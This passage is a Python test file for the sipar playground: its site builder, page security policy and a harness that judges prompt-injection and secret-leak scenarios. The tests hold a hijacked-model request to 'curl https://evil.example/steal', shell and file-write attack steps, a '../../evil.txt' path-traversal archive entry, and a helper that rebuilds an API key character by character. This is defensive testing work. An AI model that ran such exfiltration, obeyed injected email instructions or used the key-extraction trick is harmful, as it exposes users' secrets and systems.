"""The playground (playground/, tools/build_site.py): the site builder, the harness that judges a run, and the
plain-Python PBKDF2 the interpreter uses in a browser.

No network here: the Pyodide download is a step of the Pages workflow (.github/workflows/pages.yml), and
`unpack_pyodide` is tested with an archive made on the spot. The page itself (app.js in a real browser) is not
covered by these tests."""
import base64
import contextlib
import hashlib
import importlib.util
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tarfile
import tempfile
import tomllib
import unittest
import urllib.request
from types import SimpleNamespace
from unittest import mock

from rt_helpers import Prog, main_src

import sipar
import sipar.cli
from sipar.errors import SiparRuntimeError
from sipar.runtime import effects, netio
from sipar.runtime.journal import Journal

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def load(name, *parts):
    spec = importlib.util.spec_from_file_location(name, os.path.join(ROOT, *parts))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def read(*parts):
    with open(os.path.join(ROOT, *parts), encoding="utf-8") as f:
        return f.read()


site = load("sipar_build_site", "tools", "build_site.py")
glue = load("sipar_playground_glue", "playground", "glue.py")
SCENARIOS = {s["id"]: s for s in site.load_scenarios()}
KEY = "demo-key-7f3a91c2e5"
BILLING = read("playground", "scenarios", "apikey", "billing.sipar")
NO_OPENSSL = SimpleNamespace(sha256=hashlib.sha256)        # hashlib as Pyodide has it: no pbkdf2_hmac
PYODIDE_SOURCE = "https://github.com/pyodide/pyodide"       # where the source of the bundled runtime is
PAGE = "https://osimmoapies.github.io/sipar/"               # where the built site is served


def play(sid, edits=None):
    return glue.run({"scenario": SCENARIOS[sid], "edits": edits or {}})


def model(fn, *steps):
    return json.dumps({fn: list(steps)})


def billing(old, new):
    assert BILLING.count(old) == 1, old
    return {"billing.sipar": BILLING.replace(old, new)}


def brute(start, alphabet):
    """The documented limit: rebuild the key one character at a time with `if` on the key."""
    chars = ",".join(f'"{c}"' for c in alphabet)
    return billing("    // print(key)", f'''    var got = "{start}"
    var more = true
    while more {{
        more = false
        for c in [{chars}] {{
            if key.starts_with(got + c) {{
                got = got + c
                more = true
                break
            }}
        }}
    }}
    print(got)''')


def lesson(program, **extra):
    """A scenario made for one test: one program the visitor may edit, no goal."""
    return {"id": "t", "kind": "lesson", "main": "p.sipar", "files": [{"name": "p.sipar", "text": program}], **extra}


class Tmp(unittest.TestCase):
    def tmp(self):
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d, ignore_errors=True)
        return d


# ====================================================================================== tools/build_site.py

class T_Build(Tmp):
    def fake_tarball(self, extra=()):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            for name in [*site.PYODIDE_FILES, *extra]:
                data = f"content of {name}".encode()
                info = tarfile.TarInfo(f"package/{name}")
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        return buf.getvalue()

    def scenario_root(self, index, scenario):
        root = self.tmp()
        base = os.path.join(root, "playground", "scenarios")
        os.makedirs(os.path.join(base, "s"))
        with open(os.path.join(base, "index.json"), "w", encoding="utf-8") as f:
            json.dump(index, f)
        with open(os.path.join(base, "s", "scenario.json"), "w", encoding="utf-8") as f:
            json.dump(scenario, f)
        for name in ("a.sipar", "m.json"):
            with open(os.path.join(base, "s", name), "w", encoding="utf-8") as f:
                f.write(f"text of {name}")
        with open(os.path.join(root, "outside.txt"), "w", encoding="utf-8") as f:
            f.write("from the repository")
        return root

    def test_bundle_is_the_whole_package(self):
        want = {}
        for d, _dirs, names in os.walk(os.path.join(ROOT, "sipar")):
            for n in names:
                if n.endswith(".py"):
                    p = os.path.join(d, n)
                    want[os.path.relpath(p, ROOT).replace(os.sep, "/")] = read(p)
        got = site.bundle()
        self.assertEqual(got, want)
        for name in ("sipar/__init__.py", "sipar/cli.py", "sipar/runtime/effects.py", "sipar/runtime/netio.py"):
            self.assertIn(name, got)
        self.assertFalse([n for n in got if "__pycache__" in n])

    def test_bundle_takes_python_files_only_in_a_fixed_order(self):
        root = self.tmp()
        files = {"sipar/__init__.py": '__version__ = "9.8.7"\n', "sipar/b.py": "b = 'ß'\n", "sipar/a.py": "a\n",
                 "sipar/data.txt": "not code", "sipar/zsub/c.py": "c\n", "sipar/asub/d.py": "d\n",
                 "sipar/asub/deep/e.py": "e\n", "sipar/__pycache__/a.cpython-314.pyc": "\0",
                 "sipar/__pycache__/stale.py": "old\n", "sipar/asub/__pycache__/stale.py": "old\n",
                 "other/x.py": "not the package\n"}
        for i in range(12):                                 # enough names that an unsorted listing shows
            files[f"sipar/m{(i * 7) % 12:02d}.py"] = f"{i}\n"
        for path, text in files.items():
            os.makedirs(os.path.dirname(os.path.join(root, path)), exist_ok=True)
            with open(os.path.join(root, path), "w", encoding="utf-8") as f:
                f.write(text)
        got = site.bundle(root)
        top = ["sipar/__init__.py", "sipar/a.py", "sipar/b.py", *(f"sipar/m{i:02d}.py" for i in range(12))]
        self.assertEqual(list(got), [*top, "sipar/asub/d.py", "sipar/asub/deep/e.py", "sipar/zsub/c.py"])
        self.assertEqual(got["sipar/b.py"], "b = 'ß'\n")
        self.assertEqual(site.version(root), "9.8.7")
        self.assertEqual(site.version(), sipar.__version__)

    def test_bundle_runs_without_the_repository(self):
        """What worker.js does: write the bundle and glue.py into an empty folder, import glue, run."""
        d = self.tmp()
        for path, src in site.bundle().items():
            os.makedirs(os.path.dirname(os.path.join(d, path)), exist_ok=True)
            with open(os.path.join(d, path), "w", encoding="utf-8") as f:
                f.write(src)
        shutil.copyfile(os.path.join(ROOT, "playground", "glue.py"), os.path.join(d, "glue.py"))
        code = ("import sys\nsys.path.insert(0, sys.argv[1])\nimport glue, sipar\n"
                "sys.stdout.write(sipar.__file__ + '\\n' + glue.run_json(sys.stdin.read()))")
        p = subprocess.run([sys.executable, "-I", "-c", code, d], input=json.dumps({"scenario": SCENARIOS["email"]}),
                           capture_output=True, encoding="utf-8", cwd=self.tmp(), timeout=120,
                           env={**os.environ, "PYTHONIOENCODING": "utf-8"})
        self.assertEqual((p.returncode, p.stderr), (0, ""))
        where, _, answer = p.stdout.partition("\n")
        self.assertEqual(os.path.realpath(where), os.path.realpath(os.path.join(d, "sipar", "__init__.py")))
        self.assertEqual(json.loads(answer)["verdict"]["state"], "held")

    def test_scenarios(self):
        index = json.loads(read("playground", "scenarios", "index.json"))
        self.assertEqual(index, ["email", "webpage", "apikey", "trust", "tour"])    # the first one is the front page
        self.assertEqual(list(SCENARIOS), index)
        self.assertEqual(sorted(os.listdir(os.path.join(ROOT, "playground", "scenarios"))),
                         sorted([*index, "index.json"]))
        for s in SCENARIOS.values():
            with self.subTest(s["id"]):
                for key in ("title", "tab", "goal", "main"):
                    self.assertTrue(isinstance(s[key], str) and s[key].strip(), key)
                self.assertTrue(s["notes"] and all(isinstance(n, str) and n.strip() for n in s["notes"]))
                self.assertIn(s["kind"], ("challenge", "lesson"))
                self.assertIn(s["rule"]["type"], ("no_actions", "only_requests", "secret_stays", "none"))
                self.assertEqual(s["kind"] == "lesson", s["rule"]["type"] == "none")
                names = [f["name"] for f in s["files"]]
                self.assertIn(s["main"], names)
                for f in s["files"]:
                    self.assertNotIn("from", f)
                    self.assertTrue(f["text"].strip(), f["name"])
                    self.assertIn(f["role"], ("program", "attacker", "data"))
                if s["kind"] == "challenge":            # something the visitor can change
                    self.assertTrue([f for f in s["files"] if not f.get("locked")])
                for name in s.get("secrets") or []:
                    self.assertIn(name, s["env"])
                for text in (s["goal"], *s["notes"]):   # the page turns `x` into code: pairs only
                    self.assertEqual(text.count("`") % 2, 0, text)

    def test_examples_are_shown_as_shipped(self):
        def files(sid):
            return {f["name"]: f["text"] for f in SCENARIOS[sid]["files"]}
        self.assertEqual(files("email")["model.json"], read("examples", "injection", "hijacked_model.json"))
        self.assertEqual(files("email")["email.txt"], read("examples", "injection", "email.txt"))
        self.assertEqual(files("tour")["tour.sipar"], read("examples", "tour.sipar"))
        self.assertEqual(files("apikey")["billing.sipar"], BILLING)

    def test_a_good_scenario_loads(self):
        root = self.scenario_root(["s"], {"main": "a.sipar", "model": "m.json", "web": [{"url": "u", "file": "o.txt"}],
                                          "files": [{"name": "a.sipar"}, {"name": "m.json"},
                                                    {"name": "o.txt", "from": "outside.txt"}]})
        (s,) = site.load_scenarios(root)
        self.assertEqual(s["id"], "s")
        self.assertEqual(s["files"], [{"name": "a.sipar", "text": "text of a.sipar"},
                                      {"name": "m.json", "text": "text of m.json"},
                                      {"name": "o.txt", "text": "from the repository"}])

    def test_bad_scenarios_are_refused(self):
        good = {"main": "a.sipar", "files": [{"name": "a.sipar"}]}
        cases = {
            "id outside the folder": (["../s"], good, "scenario id '../s'"),
            "hidden id": ([".s"], good, "scenario id '.s'"),
            "file outside the folder": (["s"], {"main": "../a.sipar", "files": [{"name": "../a.sipar"}]},
                                        "s: file name '../a.sipar'"),
            "file in a subfolder": (["s"], {"main": "x/a.sipar", "files": [{"name": "x/a.sipar"}]},
                                    "s: file name 'x/a.sipar'"),
            "hidden file": (["s"], {**good, "files": [{"name": "a.sipar"}, {"name": ".env"}]}, "s: file name '.env'"),
            "the same name twice": (["s"], {**good, "files": [{"name": "a.sipar"}, {"name": "a.sipar"}]},
                                    "s: file name 'a.sipar'"),
            "main is not a file": (["s"], {**good, "main": "b.sipar"}, "s: main 'b.sipar' is not one of its files"),
            "model is not a file": (["s"], {**good, "model": "m.json"}, "s: model 'm.json' is not one of its files"),
            "web file is not a file": (["s"], {**good, "web": [{"url": "https://x.example/", "file": "m.json"}]},
                                       "s: web file 'm.json' is not one of its files"),
        }
        for name, (index, scenario, message) in cases.items():
            with self.subTest(name):
                with self.assertRaises(ValueError) as cm:
                    site.load_scenarios(self.scenario_root(index, scenario))
                self.assertEqual(str(cm.exception), message)

    def test_pinned_release(self):
        self.assertRegex(site.PYODIDE_VERSION, r"\A\d+\.\d+\.\d+\Z")
        self.assertEqual(site.PYODIDE_URL, f"https://registry.npmjs.org/pyodide/-/pyodide-{site.PYODIDE_VERSION}.tgz")
        self.assertEqual(len(base64.b64decode(site.PYODIDE_SHA512, validate=True)), 64)
        self.assertEqual(sorted(site.PYODIDE_FILES), ["pyodide-lock.json", "pyodide.asm.mjs", "pyodide.asm.wasm",
                                                      "pyodide.mjs", "python_stdlib.zip"])

    def test_unpack_refuses_another_archive(self):
        dest = os.path.join(self.tmp(), "pyodide")
        with self.assertRaises(ValueError) as cm:
            site.unpack_pyodide(self.fake_tarball(), dest)
        self.assertIn("nothing was unpacked", str(cm.exception))
        self.assertFalse(os.path.exists(dest))

    def test_unpack_writes_the_five_files_and_nothing_else(self):
        ball = self.fake_tarball(extra=["README.md", "../../evil.txt"])
        sha = base64.b64encode(hashlib.sha512(ball).digest()).decode("ascii")
        parent = self.tmp()
        dest = os.path.join(parent, "site", "pyodide")
        site.unpack_pyodide(ball, dest, sha512=sha)
        self.assertEqual(sorted(os.listdir(dest)), sorted(site.PYODIDE_FILES))
        for name in site.PYODIDE_FILES:
            with open(os.path.join(dest, name), "rb") as f:
                self.assertEqual(f.read(), f"content of {name}".encode())
        self.assertEqual(os.listdir(parent), ["site"])
        self.assertEqual(os.listdir(os.path.join(parent, "site")), ["pyodide"])
        site.unpack_pyodide(ball, dest, sha512=sha)         # a second build over the first one
        self.assertEqual(sorted(os.listdir(dest)), sorted(site.PYODIDE_FILES))
        with self.assertRaises(ValueError):                 # one byte more: another archive
            site.unpack_pyodide(ball + b"\0", os.path.join(parent, "other"), sha512=sha)

    def test_build(self):
        out = os.path.join(self.tmp(), "site")
        names = site.build(out, commit="c" * 50)
        self.assertEqual(names, [".nojekyll", "app.js", "build.json", "glue.py", "index.html", "og.png",
                                 "scenarios.json", "sipar_bundle.json", "style.css", "worker.js"])
        self.assertEqual(sorted(os.listdir(out)), names)    # no pyodide/ without the archive, no leftovers
        for name in site.STATIC:
            with open(os.path.join(out, name), "rb") as a, open(os.path.join(ROOT, "playground", name), "rb") as b:
                self.assertEqual(a.read(), b.read(), name)

        def made(name):
            with open(os.path.join(out, name), encoding="utf-8") as f:
                return json.load(f)
        self.assertEqual(made("scenarios.json"), site.load_scenarios())
        self.assertEqual(made("sipar_bundle.json"), site.bundle())
        self.assertEqual(made("build.json"),
                         {"sipar": sipar.__version__, "commit": "c" * 40, "pyodide": site.PYODIDE_VERSION})
        self.assertEqual(os.path.getsize(os.path.join(out, ".nojekyll")), 0)
        self.assertEqual(site.build(out), names)            # a second build over the first one
        with open(os.path.join(out, "sipar_bundle.json"), "rb") as f:
            raw = f.read()
        self.assertIn("\u2014".encode("utf-8"), raw)        # text as it is, not \u escapes: a smaller download
        compact = json.dumps(json.loads(raw), ensure_ascii=False, separators=(",", ":"))
        self.assertEqual(raw, compact.encode("utf-8"))

    def test_build_with_the_runtime(self):
        out = os.path.join(self.tmp(), "site")
        with mock.patch.object(site, "unpack_pyodide") as unpack:
            names = site.build(out, pyodide=b"the archive")
        unpack.assert_called_once_with(b"the archive", os.path.join(out, "pyodide"))
        self.assertEqual(names, sorted([".nojekyll", "app.js", "build.json", "glue.py", "index.html", "og.png",
                                        "scenarios.json", "sipar_bundle.json", "style.css", "worker.js",
                                        *(f"pyodide/{n}" for n in site.PYODIDE_FILES)]))

    def test_build_refuses_a_wrong_pyodide(self):
        out = os.path.join(self.tmp(), "site")
        with self.assertRaises(ValueError):
            site.build(out, pyodide=self.fake_tarball())
        self.assertFalse(os.path.exists(os.path.join(out, "pyodide")))

    def test_command_line(self):
        d = self.tmp()
        err = io.StringIO()
        with contextlib.redirect_stderr(err), self.assertRaises(SystemExit) as cm:
            site.main(["--out", os.path.join(d, "a")])                       # no Pyodide source named
        self.assertEqual(cm.exception.code, 2)
        self.assertIn("--pyodide", err.getvalue())
        ball = os.path.join(d, "x.tgz")
        with open(ball, "wb") as f:
            f.write(self.fake_tarball())
        with self.assertRaises(ValueError):
            site.main(["--out", os.path.join(d, "b"), "--pyodide", ball])
        with contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit):
            site.main(["--out", os.path.join(d, "c"), "--pyodide", ball, "--fetch-pyodide"])   # one source, not two
        err = io.StringIO()
        with contextlib.redirect_stderr(err), self.assertRaises(SystemExit) as cm:
            site.main(["--pyodide", ball])                                    # nowhere to write
        self.assertEqual(cm.exception.code, 2)
        self.assertIn("--out", err.getvalue())
        self.assertEqual(sorted(os.listdir(d)), ["b", "x.tgz"])     # "b": made before the archive was refused

    def test_command_line_builds_from_a_file(self):
        d = self.tmp()
        ball, out, printed = os.path.join(d, "x.tgz"), os.path.join(d, "site"), io.StringIO()
        with open(ball, "wb") as f:
            f.write(b"the archive")
        with mock.patch.object(site, "unpack_pyodide") as unpack, contextlib.redirect_stdout(printed), \
                mock.patch.object(site.urllib.request, "urlopen", side_effect=AssertionError("no download")):
            self.assertEqual(site.main(["--out", out, "--pyodide", ball, "--commit", "abc"]), 0)
        unpack.assert_called_once_with(b"the archive", os.path.join(out, "pyodide"))
        names = printed.getvalue().split("\n")
        self.assertEqual(names[-1], "")
        self.assertEqual(names[:-1], sorted(names[:-1]))
        self.assertIn("pyodide/pyodide.asm.wasm", names)
        self.assertIn("index.html", names)
        with open(os.path.join(out, "build.json"), encoding="utf-8") as f:
            self.assertEqual(json.load(f)["commit"], "abc")

    def test_command_line_downloads_the_pinned_release(self):
        class Response(io.BytesIO):
            pass
        out = os.path.join(self.tmp(), "site")
        with mock.patch.object(site.urllib.request, "urlopen", return_value=Response(b"downloaded")) as urlopen, \
                mock.patch.object(site, "unpack_pyodide") as unpack, contextlib.redirect_stdout(io.StringIO()), \
                mock.patch.dict(os.environ, {"GITHUB_SHA": "f" * 40}):
            self.assertEqual(site.main(["--out", out, "--fetch-pyodide"]), 0)
        urlopen.assert_called_once_with(site.PYODIDE_URL, timeout=120)
        unpack.assert_called_once_with(b"downloaded", os.path.join(out, "pyodide"))
        with open(os.path.join(out, "build.json"), encoding="utf-8") as f:
            self.assertEqual(json.load(f)["commit"], "f" * 40)      # the workflow's commit, without an option
        with mock.patch.object(site.urllib.request, "urlopen", return_value=Response(b"downloaded")), \
                self.assertRaises(ValueError):                      # the real check: these bytes are not the release
            site.main(["--out", out, "--fetch-pyodide"])

    def test_command_line_as_a_script(self):
        p = subprocess.run([sys.executable, os.path.join(ROOT, "tools", "build_site.py"), "--help"],
                           capture_output=True, encoding="utf-8", cwd=self.tmp(), timeout=60)
        self.assertEqual((p.returncode, p.stderr), (0, ""))
        self.assertIn("Builds the playground site (GitHub Pages)", p.stdout)
        for option in ("--out", "--commit", "--pyodide", "--fetch-pyodide", site.PYODIDE_URL):
            self.assertIn(option, p.stdout)


# =========================================================================================== the page files

class T_Page(unittest.TestCase):
    CSP = ("default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self'; img-src 'self' data:; "
           "connect-src 'self'; worker-src 'self'; base-uri 'none'; form-action 'none'")

    def test_content_security_policy(self):
        html = read("playground", "index.html")
        found = re.findall(r'<meta http-equiv="Content-Security-Policy" content="([^"]*)">', html)
        self.assertEqual(found, [self.CSP])
        at = html.index("Content-Security-Policy")
        for later in ("<link ", "<script", "<body"):        # the policy comes before anything that loads
            self.assertLess(at, html.index(later))

    def test_no_inline_code(self):
        """The policy allows no inline script or style: one would be dropped without a word."""
        html = read("playground", "index.html")
        self.assertEqual(re.findall(r"<script\b[^>]*>", html), ['<script type="module" src="app.js">'])
        self.assertEqual(re.findall(r'<link\b[^>]*rel="stylesheet"[^>]*>', html),
                         ['<link rel="stylesheet" href="style.css">'])
        self.assertNotRegex(html, r"<style\b|\sstyle\s*=|\son[a-z]+\s*=|javascript:")

    def test_nothing_comes_from_another_site(self):
        own = "https://github.com/osimmoapies/sipar"
        seen = 0
        for name in ("index.html", "app.js", "worker.js", "style.css", "glue.py"):
            text = read("playground", name).replace("\\/", "/").replace("\\.", ".")
            for url in re.findall(r"""https?://[^\s"'<>)`]+""", text):
                seen += 1
                if url == "http://www.w3.org/2000/svg":     # a namespace inside the inline icon, not a request
                    continue
                if name == "index.html" and url == PYODIDE_SOURCE:      # a link to follow, in the footer note only
                    continue
                if name == "index.html" and url in (PAGE, PAGE + "og.png"):     # what a shared link shows
                    continue
                self.assertTrue(url == own or url.startswith(own + "/") or url.startswith(own + "#")
                                or url.startswith(own + "("), f"{name}: {url}")
        self.assertGreater(seen, 5)                         # the search itself works
        for name in ("app.js", "worker.js"):
            self.assertNotRegex(read("playground", name), r"\beval\(|new Function\(|innerHTML|document\.write")

    def test_a_shared_link_shows_a_picture(self):
        """The preview a chat or a feed draws for a link: an absolute address, and the picture is really shipped."""
        html = read("playground", "index.html")
        meta = dict(re.findall(r'<meta (?:property|name)="((?:og|twitter):[a-z:_]+)" content="([^"]*)">', html))
        self.assertEqual(meta["og:url"], PAGE)
        self.assertEqual(meta["og:image"], PAGE + "og.png")
        self.assertEqual(meta["twitter:card"], "summary_large_image")
        self.assertIn("og.png", site.STATIC)
        with open(os.path.join(ROOT, "playground", "og.png"), "rb") as f:
            png = f.read()
        self.assertEqual(png[:8], b"\x89PNG\r\n\x1a\n")
        self.assertEqual(png[12:16], b"IHDR")
        size = (int.from_bytes(png[16:20], "big"), int.from_bytes(png[20:24], "big"))
        self.assertEqual(size, (int(meta["og:image:width"]), int(meta["og:image:height"])))
        self.assertEqual(size, (1200, 630))
        self.assertLess(len(png), 300_000)
        self.assertGreater(len(meta["og:image:alt"]), 20)
        self.assertIn(PAGE, read("README.md"))
        self.assertIn(PAGE, read("README.ru.md"))
        self.assertIn(PAGE, read("CONTRIBUTING.md"))

    def test_the_page_says_where_the_runtime_comes_from(self):
        """Pyodide is under the MPL 2.0: whoever is served the built runtime must be told where its source is."""
        html = read("playground", "index.html")
        foot = html[html.index('<footer class="foot">'):html.index("</footer>")]
        self.assertEqual(re.findall(r'<a href="([^"]*)">Pyodide</a>', foot), [PYODIDE_SOURCE])
        self.assertIn("Mozilla Public License 2.0", foot)
        self.assertIn("its source is at that link", foot)
        self.assertIn("MIT or Apache-2.0", foot)
        self.assertEqual(html.count(PYODIDE_SOURCE), 1)

    def test_files_the_page_asks_for_are_built(self):
        built = set(site.STATIC) | {"scenarios.json", "sipar_bundle.json", "build.json"}
        asked = set()
        for name in ("app.js", "worker.js"):
            asked |= set(re.findall(r'"([\w.]+\.(?:json|py|js|css))"', read("playground", name)))
        self.assertEqual(asked - built, set())
        self.assertLessEqual({"scenarios.json", "build.json", "worker.js", "sipar_bundle.json", "glue.py"}, asked)
        self.assertIn('from "./pyodide/pyodide.mjs"', read("playground", "worker.js"))
        self.assertIn("pyodide.mjs", site.PYODIDE_FILES)

    def test_limits_match(self):
        m = re.search(r"const MAX_EDIT = (\d+);", read("playground", "app.js"))
        self.assertEqual(int(m.group(1)), glue.MAX_EDIT)


# ================================================================================ glue.py: real runs

class T_Harness(Tmp):
    def assertKeyHidden(self, r):
        self.assertNotIn(KEY, json.dumps(r, ensure_ascii=False))

    def test_answer_shape(self):
        r = play("email")
        self.assertEqual(sorted(r), ["events", "journal", "ms", "rc", "stderr", "stdout", "verdict"])
        self.assertEqual(sorted(r["verdict"]), ["state", "text", "title"])
        self.assertIsInstance(r["ms"], int)
        self.assertEqual(json.loads(glue.run_json(json.dumps({"scenario": SCENARIOS["email"]})))["verdict"],
                         r["verdict"])

    def test_email_as_shipped(self):
        r = play("email")
        self.assertEqual((r["rc"], r["stderr"], r["events"]), (0, "", []))
        self.assertEqual(r["verdict"]["state"], "held")
        self.assertEqual(r["verdict"]["title"], "Held")
        self.assertTrue(r["stdout"].startswith(
            "BLOCKED (taint): untrusted data (untrusted:ai:assistant) cannot flow into shell.run(cmd)"), r["stdout"])
        self.assertIn("curl https://evil.example/steal", r["journal"])      # the model did ask for it

    def test_email_attacks(self):
        attacks = [
            ("ls is on the allow list", {"tool": "run_cmd", "args": {"cmd": "ls"}}, "shell.run(cmd)"),
            ("curl is on the allow list", {"tool": "run_cmd", "args": {"cmd": "curl https://evil.example/"}},
             "shell.run(cmd)"),
            ("a note in the allowed folder", {"tool": "save_note", "args": {"path": "out/a.txt", "text": "pwned"}},
             "fs.write(path)"),
        ]
        for name, step, sink in attacks:
            with self.subTest(name):
                r = play("email", {"model.json": model("assistant", step, {"final": "done"})})
                self.assertEqual((r["rc"], r["events"], r["verdict"]["state"]), (0, [], "held"))
                self.assertIn(f"cannot flow into {sink}", r["stdout"])

    def test_a_model_that_asks_for_nothing(self):
        r = play("email", {"model.json": model("assistant", {"final": "All quiet."})})
        self.assertEqual((r["rc"], r["stdout"], r["events"], r["verdict"]["state"]), (0, "All quiet.\n", [], "held"))

    def test_a_broken_model_file_is_not_called_held(self):
        """Nothing was attempted, so "Held" would claim a defence that was never tested."""
        broken = {"not JSON": "{ this is not json", "another function": model("somebody", {"final": "x"}),
                  "no replies": model("assistant"), "not an object": "[]"}
        for sid, fn in (("email", "assistant"), ("webpage", "researcher")):
            for name, text in broken.items():
                with self.subTest(sid=sid, case=name):
                    r = play(sid, {"model.json": text.replace("assistant", fn)})
                    self.assertEqual(r["events"], [])
                    self.assertEqual(r["verdict"]["state"], "none")
                    self.assertEqual(r["verdict"]["title"], "The model said nothing")
                    self.assertIn("model.json could not be used", r["verdict"]["text"])
                    self.assertIn("BLOCKED (ai)", r["stdout"])

    def test_locked_files_cannot_be_changed(self):
        edits = {"assistant.sipar": 'fn main() { print("changed") }', "email.txt": "changed"}
        base, r = play("email"), play("email", edits)
        self.assertEqual((r["stdout"], r["verdict"], r["events"]), (base["stdout"], base["verdict"], base["events"]))
        self.assertNotIn("changed", json.dumps(r))
        files = glue.scenario_files(SCENARIOS["email"], edits)
        self.assertEqual(files, {f["name"]: f["text"] for f in SCENARIOS["email"]["files"]})

    def test_edits(self):
        s = SCENARIOS["email"]
        shipped = {f["name"]: f["text"] for f in s["files"]}
        self.assertEqual(glue.scenario_files(s, None), shipped)
        for junk in (5, None, ["x"], {"a": 1}, True):               # from a link somebody made by hand
            self.assertEqual(glue.scenario_files(s, {"model.json": junk}), shipped)
        self.assertEqual(glue.scenario_files(s, {"nope.txt": "x", "../x": "y"}), shipped)     # only its own files
        self.assertEqual(glue.scenario_files(s, {"model.json": ""})["model.json"], "")
        long = glue.scenario_files(s, {"model.json": "x" * (glue.MAX_EDIT + 10)})["model.json"]
        self.assertEqual(len(long), glue.MAX_EDIT)
        self.assertEqual(play("apikey", {"billing.sipar": 'fn main() { print("changed") }'})["stdout"], "changed\n")

    def test_a_run_does_not_change_the_scenario(self):
        before = json.dumps(SCENARIOS, sort_keys=True)
        play("apikey", billing("    // print(key)", "    print(key)"))
        play("email", {"model.json": "x"})
        self.assertEqual(json.dumps(SCENARIOS, sort_keys=True), before)

    def test_webpage_as_shipped(self):
        r = play("webpage")
        fixed = {"kind": "http", "method": "GET", "url": "https://news.example/today", "body": "", "headers": {}}
        self.assertEqual((r["rc"], r["events"], r["verdict"]["state"]), (0, [fixed], "held"))
        self.assertIn("One request left: the fixed one.", r["verdict"]["text"])
        self.assertIn("cannot flow into http.get(url)", r["stdout"])
        self.assertIn("Markets were quiet", r["journal"])           # the page served is page.html

    def test_webpage_attacks(self):
        news = {"tool": "fetch_news", "args": {}}
        cases = [
            ("a report", [{"tool": "send_report", "args": {"text": "what I know"}}], 0, "http.post(body)"),
            ("a path", [news, {"tool": "fetch_page", "args": {"path": "today"}}], 1, "http.get(url)"),
            ("the fixed page twice", [news, news], 2, None),
            ("nothing", [], 0, None),
        ]
        for name, steps, requests, sink in cases:
            with self.subTest(name):
                r = play("webpage", {"model.json": model("researcher", *steps, {"final": "done"})})
                self.assertEqual(r["verdict"]["state"], "held")
                self.assertEqual([f"{e['method']} {e['url']} {e['body']}" for e in r["events"]],
                                 ["GET https://news.example/today "] * requests)
                self.assertIn(("No request left at all.", "One request left: the fixed one.",
                               "2 requests left, all of them the fixed one.")[requests], r["verdict"]["text"])
                if sink:
                    self.assertIn(f"cannot flow into {sink}", r["stdout"])
                else:
                    self.assertEqual(r["stdout"], "done\n")

    def test_apikey_as_shipped(self):
        r = play("apikey")
        self.assertEqual((r["rc"], r["stderr"], r["verdict"]["state"]), (0, "", "held"))
        self.assertEqual(r["events"], [{"kind": "http", "method": "GET", "url": "https://api.example/v1/invoices",
                                        "body": "", "headers": {"Authorization": "Bearer ‹API_KEY›"}}])
        self.assertIn("sent as a header value 1 time:", r["verdict"]["text"])
        self.assertIn("invoices: [", r["stdout"])
        self.assertKeyHidden(r)

    def test_apikey_every_suggested_leak_is_stopped(self):
        lines = [
            ("    // print(key)", "print(value)"),
            ('    // print("the key is {key}")', "print(value)"),
            ('    // fs.write("out/key.txt", key)', "fs.write(text)"),
            ('    // print(http.get("https://api.example/v1/echo?k={key}"))', "http.get(url)"),
            ('    // print(http.get("https://api.example/v1/echo", headers: ["Authorization": "Bearer {key}"]))',
             "print(value)"),
        ]
        for line, sink in lines:
            with self.subTest(line.strip()):
                r = play("apikey", billing(line, line.replace("// ", "", 1)))
                self.assertEqual((r["rc"], r["verdict"]["state"]), (1, "held"))
                self.assertIn(f"secret:API_KEY cannot flow into {sink}", r["stderr"])
                self.assertEqual([e["kind"] for e in r["events"] if e["kind"] != "http"], [])
                self.assertKeyHidden(r)
        self.assertEqual(sum(1 for line in BILLING.split("\n") if line.startswith("    // print(")
                             or line.startswith("    // fs.")), len(lines))     # every one of them is tried above

    def test_apikey_the_if_line_runs(self):
        line = '    // if key.starts_with("demo") { print("it starts with demo") }'
        r = play("apikey", billing(line, line.replace("// ", "", 1)))
        self.assertEqual((r["rc"], r["verdict"]["state"]), (0, "held"))
        self.assertIn("it starts with demo\n", r["stdout"])

    def test_apikey_a_typed_key_is_your_own_copy(self):
        for name, code in (("in one piece", f'    print("{KEY}")'),
                           ("in two pieces", f'    print("{KEY[:9]}" + "{KEY[9:]}")'),
                           ("to a file", f'    fs.write("out/key.txt", "{KEY}")')):
            with self.subTest(name):
                r = play("apikey", billing("    // print(key)", code))
                self.assertEqual((r["rc"], r["verdict"]["state"]), (0, "off"))
                self.assertEqual(r["verdict"]["title"], "That is your own copy")

    def test_apikey_without_the_declaration_it_is_not_a_secret(self):
        program = (BILLING.replace('allow secret ["API_KEY"]\n', "").replace("uses net, fs.write, secret",
                                                                              "uses net, fs.write")
                   .replace('env.secret("API_KEY")', f'"{KEY}"').replace("    // print(key)", "    print(key)"))
        r = play("apikey", {"billing.sipar": program})
        self.assertEqual((r["rc"], r["verdict"]["state"]), (0, "off"))
        self.assertEqual(r["verdict"]["title"], "Not a secret any more")
        self.assertIn('allow secret ["API_KEY"]', r["verdict"]["text"])

    def test_apikey_the_documented_limit_is_named(self):
        cases = {"knows nothing": brute("", "abcdef0123456789kmoy-"), "knows the prefix": brute("demo-key-", "0123456789abcdef")}
        for name, edits in cases.items():
            with self.subTest(name):
                r = play("apikey", edits)
                v = r["verdict"]
                self.assertEqual((r["rc"], v["state"], v["title"]), (0, "limit", "The key got out"))
                self.assertIn(KEY + "\n", r["stdout"])              # the visitor sees what they got
                self.assertIn("API_KEY is in the output (checked again with a second, random key)", v["text"])
                self.assertIn(glue.LIMIT, v["text"])
                self.assertIn(glue.REPORT, v["text"])
                self.assertEqual(v["text"].count("`") % 2, 0)

    def test_apikey_a_program_that_does_not_run(self):
        for name, program, message in (("syntax", "fn main( {", "error[E110]"), ("empty", "", "has no 'fn main()'"),
                                       ("blank", " \n", "has no 'fn main()'")):
            with self.subTest(name):
                r = play("apikey", {"billing.sipar": program})
                self.assertEqual((r["rc"], r["stdout"], r["events"]), (1, "", []))
                self.assertEqual((r["verdict"]["state"], r["verdict"]["title"]), ("none", "Did not run"))
                self.assertIn(message, r["stderr"])

    def test_lessons_have_no_verdict(self):
        r = play("trust")
